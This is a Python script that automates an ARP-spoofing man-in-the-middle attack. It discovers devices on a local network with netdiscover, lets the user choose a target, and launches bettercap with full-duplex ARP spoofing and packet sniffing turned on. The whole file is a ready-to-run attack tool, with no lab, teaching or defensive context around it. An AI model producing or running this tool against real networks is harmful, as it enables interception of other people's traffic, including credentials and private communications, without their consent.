import subprocess
import sys
import time
import re

def discover_devices(interface):
    """
    Discovers devices on the network using netdiscover and returns a list of them.
    """
    print(f"[*] Starting device discovery on {interface}. This may take a minute...")
    try:
        # We use -P to print results to stdout and -L to run for a short time
        process = subprocess.Popen(
            ["netdiscover", "-i", interface, "-P", "-L"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        stdout, stderr = process.communicate(timeout=60) # Set a timeout
        
        if process.returncode != 0 and "permission denied" in stderr.lower():
            print("\n[-] Permission Denied. Please run this script with sudo.")
            sys.exit(1)

        # Regex to find IP addresses and MACs from netdiscover output
        # Example line: '192.168.1.1\t00:11:22:33:44:55\t\t1\t\t60\t\tRouter Vendor'
        device_pattern = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+([0-9a-fA-F:]{17})")
        devices = device_pattern.findall(stdout)
        
        if not devices:
            print("[-] No devices discovered. Check your network interface and permissions.")
            return None, None

        print("[+] Discovery complete. Found the following devices:")
        gateway_ip = None
        for i, (ip, mac) in enumerate(devices):
            # The gateway is often the .1 address, let's make a guess
            if ip.endswith(".1"):
                print(f"  {i+1}) IP: {ip}, MAC: {mac}  <-- Likely Gateway")
                gateway_ip = ip
            else:
                print(f"  {i+1}) IP: {ip}, MAC: {mac}")
        
        return devices, gateway_ip

    except FileNotFoundError:
        print("[-] 'netdiscover' not found. Please install it (`apt-get install netdiscover`).")
        sys.exit(1)
    except subprocess.TimeoutExpired:
        print("\n[-] Netdiscover timed out. Please try again.")
        sys.exit(1)


def run_mitm_attack(interface, target_ip, gateway_ip):
    """
    Launches bettercap to perform the ARP spoofing and packet sniffing.
    """
    print(f"\n[*] Configuring bettercap for MITM attack...")
    print(f"    - Target: {target_ip}")
    print(f"    - Gateway: {gateway_ip}")
    print(f"    - Sniffing: ON")

    # Construct the bettercap commands
    # We will spoof both the client and the gateway (fullduplex)
    # and turn on the sniffer to capture data.
    commands = [
        f"set arp.spoof.fullduplex true;",
        f"set arp.spoof.targets {target_ip};",
        "arp.spoof on;",
        "net.sniff on;"
    ]
    full_command_str = " ".join(commands)

    print("\n[*] Launching bettercap. Press Ctrl+C to stop the attack.")
    print("--- BETTERCAP OUTPUT ---")
    
    try:
        # Start bettercap process
        subprocess.run(
            ["bettercap", "-iface", interface, "-eval", full_command_str],
            check=True
        )
    except FileNotFoundError:
        print("[-] 'bettercap' not found. Please make sure it's installed and in your PATH.")
        sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"[-] Bettercap failed to run. Error: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[+] Attack stopped by user. Exiting.")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: sudo python3 {sys.argv[0]} <interface>")
        sys.exit(1)

    network_interface = sys.argv[1]

    # Step 1: Discover Devices
    discovered_devices, guessed_gateway = discover_devices(network_interface)

    if not discovered_devices:
        sys.exit(1)

    # Step 2: Get User Input
    try:
        target_choice = int(input("\n> Enter the number of the target device: ")) - 1
        if not (0 <= target_choice < len(discovered_devices)):
            print("[-] Invalid selection.")
            sys.exit(1)
        
        client_ip = discovered_devices[target_choice][0]

        router_ip_default = guessed_gateway if guessed_gateway else ""
        router_ip = input(f"> Enter the gateway/router IP [{router_ip_default}]: ") or router_ip_default
        
        if not router_ip:
            print("[-] Gateway IP is required.")
            sys.exit(1)
            
    except (ValueError, IndexError):
        print("[-] Invalid input.")
        sys.exit(1)

    # Step 3: Launch the attack
    run_mitm_attack(network_interface, client_ip, router_ip)